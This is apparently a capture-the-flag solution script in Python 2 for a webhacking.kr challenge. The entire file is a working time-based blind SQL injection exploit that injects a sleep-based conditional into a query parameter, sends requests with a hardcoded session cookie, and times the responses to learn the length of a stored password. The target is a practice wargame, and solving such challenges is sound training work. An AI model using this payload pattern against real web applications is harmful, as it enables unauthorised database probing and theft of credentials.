#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import httplib
import time
 
for i in range(0,30):
    url = "/challenge/web/web-34/index.php?msg=m&se=if(length(pw)="+str(i)+",sleep(3),0)"
    cookie = {'Cookie':'PHPSESSID=2h72rdfmeu9o6mlteu1rc2cla6'}
    try:
        st = time.time()
        conn = httplib.HTTPConnection('webhacking.kr')
        conn.request('GET',url,'',cookie)
        data = conn.getresponse().read()
        conn.close()
        et = time.time()
    except:
        print "exception"
        continue
 
    t = et - st
    print ("%d, %f") % (i,t)
    if(t > 2):
        print "length: {}".format(i)
        break
